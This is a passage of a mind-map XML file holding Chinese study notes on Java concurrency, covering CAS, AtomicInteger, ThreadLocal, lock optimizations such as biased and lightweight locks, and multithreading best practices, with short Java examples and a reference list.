    at ImmutableExample.main(ImmutableExample.java:9)</pre>
    <p dir="auto">
      Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。
    </p>
    <pre>public V put(K key, V value) {
    throw new UnsupportedOperationException();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1047746067" CREATED="1754750650618" MODIFIED="1754750650620"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      互斥同步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 互斥同步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#互斥同步">
</a>
    <p dir="auto">
      synchronized 和 ReentrantLock。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1812573252" CREATED="1754750650620" MODIFIED="1754750650622"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      非阻塞同步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 非阻塞同步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#非阻塞同步">
</a>
    <p dir="auto">
      互斥同步最主要的问题就是线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步。
    </p>
    <p dir="auto">
      互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。
    </p>
    <p dir="auto">
      随着硬件指令集的发展，我们可以使用基于冲突检测的乐观并发策略：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。
    </p>
  </body>
</html></richcontent>
<node ID="ID_830705211" CREATED="1754750650622" MODIFIED="1754750650625"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. CAS
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. CAS" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#1-cas">
</a>
    <p dir="auto">
      乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。CAS 指令需要有 3 个操作数，分别是内存地址 V、旧的预期值 A 和新值 B。当执行操作时，只有当 V 的值等于 A，才将 V 的值更新为 B。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_613629472" CREATED="1754750650625" MODIFIED="1754750650627"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. AtomicInteger
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. AtomicInteger" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#2-atomicinteger">
</a>
    <p dir="auto">
      J.U.C 包里面的整数原子类 AtomicInteger 的方法调用了 Unsafe 类的 CAS 操作。
    </p>
    <p dir="auto">
      以下代码使用了 AtomicInteger 执行了自增的操作。
    </p>
    <pre>private AtomicInteger cnt = new AtomicInteger();
public void add() {
    cnt.incrementAndGet();
}</pre>
    <p dir="auto">
      以下代码是 incrementAndGet() 的源码，它调用了 Unsafe 的 getAndAddInt() 。
    </p>
    <pre>public final int incrementAndGet() {
    return unsafe.getAndAddInt(this, valueOffset, 1) + 1;
}</pre>
    <p dir="auto">
      以下代码是 getAndAddInt() 源码，var1 指示对象内存地址，var2 指示该字段相对对象内存地址的偏移，var4 指示操作需要加的数值，这里为 1。通过 getIntVolatile(var1, var2) 得到旧的预期值，通过调用 compareAndSwapInt() 来进行 CAS 比较，如果该字段内存地址中的值等于 var5，那么就更新内存地址为 var1+var2 的变量为 var5+var4。
    </p>
    <p dir="auto">
      可以看到 getAndAddInt() 在一个循环中进行，发生冲突的做法是不断的进行重试。
    </p>
    <pre>public final int getAndAddInt(Object var1, long var2, int var4) {
    int var5;
    do {
        var5 = this.getIntVolatile(var1, var2);
    } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));
    return var5;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1575010681" CREATED="1754750650627" MODIFIED="1754750650629"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. ABA
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. ABA" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#3-aba">
</a>
    <p dir="auto">
      如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。
    </p>
    <p dir="auto">
      J.U.C 包提供了一个带有标记的原子引用类 AtomicStampedReference 来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1530870113" CREATED="1754750650629" MODIFIED="1754750650631"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      无同步方案
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 无同步方案" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#无同步方案">
</a>
    <p dir="auto">
      要保证线程安全，并不是一定就要进行同步。如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1334606051" CREATED="1754750650631" MODIFIED="1754750650633"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 栈封闭
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 栈封闭" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#1-栈封闭">
</a>
    <p dir="auto">
      多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的。
    </p>
    <pre>public class StackClosedExample {
    public void add100() {
        int cnt = 0;
        for (int i = 0; i &lt; 100; i++) {
            cnt++;
        }
        System.out.println(cnt);
    }
}</pre>
    <pre>public static void main(String[] args) {
    StackClosedExample example = new StackClosedExample();
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; example.add100());
    executorService.execute(() -&gt; example.add100());
    executorService.shutdown();
}</pre>
    <pre>100
100</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_220349007" CREATED="1754750650633" MODIFIED="1754750650635"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 线程本地存储（Thread Local Storage）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 线程本地存储（Thread Local Storage）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#2-线程本地存储thread-local-storage">
</a>
    <p dir="auto">
      如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。
    </p>
    <p dir="auto">
      符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。
    </p>
    <p dir="auto">
      可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。
    </p>
    <p dir="auto">
      对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。
    </p>
    <pre>public class ThreadLocalExample {
    public static void main(String[] args) {
        ThreadLocal threadLocal = new ThreadLocal();
        Thread thread1 = new Thread(() -&gt; {
            threadLocal.set(1);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.out.println(threadLocal.get());
            threadLocal.remove();
        });
        Thread thread2 = new Thread(() -&gt; {
            threadLocal.set(2);
            threadLocal.remove();
        });
        thread1.start();
        thread2.start();
    }
}</pre>
    <pre>1</pre>
    <p dir="auto">
      为了理解 ThreadLocal，先看以下代码：
    </p>
    <pre>public class ThreadLocalExample1 {
    public static void main(String[] args) {
        ThreadLocal threadLocal1 = new ThreadLocal();
        ThreadLocal threadLocal2 = new ThreadLocal();
        Thread thread1 = new Thread(() -&gt; {
            threadLocal1.set(1);
            threadLocal2.set(1);
        });
        Thread thread2 = new Thread(() -&gt; {
            threadLocal1.set(2);
            threadLocal2.set(2);
        });
        thread1.start();
        thread2.start();
    }
}</pre>
    <p dir="auto">
      它所对应的底层结构图为：
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fe456253127b20d64932bbbaf5754138629f50bbd173a5770f9a275072807f33/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36373832363734632d316266652d343837392d616633392d6539643732326139356433392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/fe456253127b20d64932bbbaf5754138629f50bbd173a5770f9a275072807f33/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36373832363734632d316266652d343837392d616633392d6539643732326139356433392e706e67" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6782674c-1bfe-4879-af39-e9d722a95d39.png"/>
    </a><br/>
    

    <p dir="auto">
      每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象。
    </p>
    <pre>/* ThreadLocal values pertaining to this thread. This map is maintained
 * by the ThreadLocal class. */
ThreadLocal.ThreadLocalMap threadLocals = null;</pre>
    <p dir="auto">
      当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。
    </p>
    <pre>public void set(T value) {
    Thread t = Thread.currentThread();
    ThreadLocalMap map = getMap(t);
    if (map != null)
        map.set(this, value);
    else
        createMap(t, value);
}</pre>
    <p dir="auto">
      get() 方法类似。
    </p>
    <pre>public T get() {
    Thread t = Thread.currentThread();
    ThreadLocalMap map = getMap(t);
    if (map != null) {
        ThreadLocalMap.Entry e = map.getEntry(this);
        if (e != null) {
            @SuppressWarnings(&quot;unchecked&quot;)
            T result = (T)e.value;
            return result;
        }
    }
    return setInitialValue();
}</pre>
    <p dir="auto">
      ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。
    </p>
    <p dir="auto">
      在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，应该尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_940348128" CREATED="1754750650636" MODIFIED="1754750650637"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 可重入代码（Reentrant Code）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 可重入代码（Reentrant Code）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#3-可重入代码reentrant-code">
</a>
    <p dir="auto">
      这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。
    </p>
    <p dir="auto">
      可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1996730488" CREATED="1754750650637" MODIFIED="1754750650639"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十二、锁优化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十二、锁优化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#十二锁优化">
</a>
    <p dir="auto">
      这里的锁优化主要是指 JVM 对 synchronized 的优化。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1896030002" CREATED="1754750650640" MODIFIED="1754750650641"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      自旋锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 自旋锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#自旋锁">
</a>
    <p dir="auto">
      互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。
    </p>
    <p dir="auto">
      自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。
    </p>
    <p dir="auto">
      在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1838753407" CREATED="1754750650641" MODIFIED="1754750650643"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      锁消除
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 锁消除" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#锁消除">
</a>
    <p dir="auto">
      锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。
    </p>
    <p dir="auto">
      锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。
    </p>
    <p dir="auto">
      对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：
    </p>
    <pre>public static String concatString(String s1, String s2, String s3) {
    return s1 + s2 + s3;
}</pre>
    <p dir="auto">
      String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作：
    </p>
    <pre>public static String concatString(String s1, String s2, String s3) {
    StringBuffer sb = new StringBuffer();
    sb.append(s1);
    sb.append(s2);
    sb.append(s3);
    return sb.toString();
}</pre>
    <p dir="auto">
      每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1097401700" CREATED="1754750650643" MODIFIED="1754750650644"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      锁粗化
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 锁粗化" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#锁粗化">
</a>
    <p dir="auto">
      如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。
    </p>
    <p dir="auto">
      上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_744666365" CREATED="1754750650645" MODIFIED="1754750650647"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      轻量级锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 轻量级锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#轻量级锁">
</a>
    <p dir="auto">
      JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。
    </p>
    <p dir="auto">
      以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 Mark Word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dfd8235b81f68d5e485bfa03339146a29372b374174f39742e21d96284d23380/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62623661343962652d303066322d346632372d613063652d3465643736346263363035632e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/dfd8235b81f68d5e485bfa03339146a29372b374174f39742e21d96284d23380/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62623661343962652d303066322d346632372d613063652d3465643736346263363035632e706e67" width="500" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bb6a49be-00f2-4f27-a0ce-4ed764bc605c.png"/>
    </a><br/>
    

    <p dir="auto">
      下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bc66950a15e2d82c5e8bc035764cfab7efde108e805dc8c656443b9b52e8241f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30353165343336632d306534362d346335392d386636372d3532643839643635363138322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/bc66950a15e2d82c5e8bc035764cfab7efde108e805dc8c656443b9b52e8241f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30353165343336632d306534362d346335392d386636372d3532643839643635363138322e706e67" width="500" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/051e436c-0e46-4c59-8f67-52d89d656182.png"/>
    </a><br/>
    

    <p dir="auto">
      轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。
    </p>
    <p dir="auto">
      当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a5fa1e0b5251af452c05f67d7b9cacf817c8e06f799f9efad288c4e83edd9cc4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62616161363831662d376335322d343139382d613561652d3330336239333836636634372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a5fa1e0b5251af452c05f67d7b9cacf817c8e06f799f9efad288c4e83edd9cc4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62616161363831662d376335322d343139382d613561652d3330336239333836636634372e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/baaa681f-7c52-4198-a5ae-303b9386cf47.png"/>
    </a><br/>
    

    <p dir="auto">
      如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_366690238" CREATED="1754750650648" MODIFIED="1754750650650"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      偏向锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 偏向锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#偏向锁">
</a>
    <p dir="auto">
      偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。
    </p>
    <p dir="auto">
      当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。
    </p>
    <p dir="auto">
      当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/12d6b1241bab90cba467fd8825947a0e838d4c1bad3ff8af896770f30e24607d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33393063393133622d356633312d343434662d626264622d3262383862363838653763652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/12d6b1241bab90cba467fd8825947a0e838d4c1bad3ff8af896770f30e24607d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33393063393133622d356633312d343434662d626264622d3262383862363838653763652e6a7067" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/390c913b-5f31-444f-bbdb-2b88b688e7ce.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1599070521" CREATED="1754750650650" MODIFIED="1754750650653"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十三、多线程开发良好的实践
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十三、多线程开发良好的实践" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#十三多线程开发良好的实践">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          给线程起个有意义的名字，这样可以方便找 Bug。
        </p>
      </li>
      <li>
        <p dir="auto">
          缩小同步范围，从而减少锁争用。例如对于 synchronized，应该尽量使用同步块而不是同步方法。
        </p>
      </li>
      <li>
        <p dir="auto">
          多用同步工具少用 wait() 和 notify()。首先，CountDownLatch, CyclicBarrier, Semaphore 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现复杂控制流；其次，这些同步类是由最好的企业编写和维护，在后续的 JDK 中还会不断优化和完善。
        </p>
      </li>
      <li>
        <p dir="auto">
          使用 BlockingQueue 实现生产者消费者问题。
        </p>
      </li>
      <li>
        <p dir="auto">
          多用并发集合少用同步集合，例如应该使用 ConcurrentHashMap 而不是 Hashtable。
        </p>
      </li>
      <li>
        <p dir="auto">
          使用本地变量和不可变类来保证线程安全。
        </p>
      </li>
      <li>
        <p dir="auto">
          使用线程池而不是直接创建线程，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_129735785" CREATED="1754750650653" MODIFIED="1754750650655"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        BruceEckel. Java 编程思想: 第 4 版 [M]. 机械工业出版社, 2007.
      </li>
      <li>
        周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011.
      </li>
      <li>
        <a href="https://docs.oracle.com/javase/specs/jvms/se6/html/Threads.doc.html" rel="nofollow">Threads and Locks</a>
      </li>
      <li>
        <a href="http://ifeve.com/thread-signaling/#missed_signal" rel="nofollow">线程通信</a>
      </li>
      <li>
        <a href="http://www.importnew.com/12773.html" rel="nofollow">Java 线程面试题 Top 50</a>
      </li>
      <li>
        <a href="http://tutorials.jenkov.com/java-util-concurrent/blockingqueue.html" rel="nofollow">BlockingQueue</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/11265289/thread-state-java" rel="nofollow">thread state java</a>
      </li>
      <li>
        <a href="http://wiki.expertiza.ncsu.edu/index.php/CSC_456_Spring_2012/ch7_MN" rel="nofollow">CSC 456 Spring 2012/ch7 MN</a>
      </li>
      <li>
        <a href="https://www.logicbig.com/tutorials/core-java-tutorial/java-multi-threading/happens-before.html" rel="nofollow">Java - Understanding Happens-before relationship</a>
      </li>
      <li>
        <a href="https://www.slideshare.net/novathinker/6-thread-synchronization" rel="nofollow">6장 Thread Synchronization</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/1202444/how-is-javas-threadlocal-implemented-under-the-hood/15653015" rel="nofollow">How is Java's ThreadLocal implemented under the hood?</a>
      </li>
      <li>
        <a href="https://sites.google.com/site/webdevelopart/21-compile/06-java/javase/concurrent?tmpl=%2Fsystem%2Fapp%2Ftemplates%2Fprint%2F&amp;showPrintDialog=1" rel="nofollow">Concurrent</a>
      </li>
      <li>
        <a href="http://www.javacreed.com/java-fork-join-example/" title="Java Fork Join Example" rel="nofollow">JAVA FORK JOIN EXAMPLE</a>
      </li>
      <li>
        <a href="http://ifeve.com/talk-concurrency-forkjoin/" rel="nofollow">聊聊并发（八）——Fork/Join 框架介绍</a>
      </li>
      <li>
        <a href="http://www.oracle.com/technetwork/java/javase/tech/biasedlocking-oopsla2006-preso-150106.pdf" rel="nofollow">Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_178878769" CREATED="1754749807838" MODIFIED="1754750669492" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 虚拟机
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1289786542" CREATED="1754750650658" MODIFIED="1754750650660"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、运行时数据区域
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、运行时数据区域" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#一运行时数据区域">
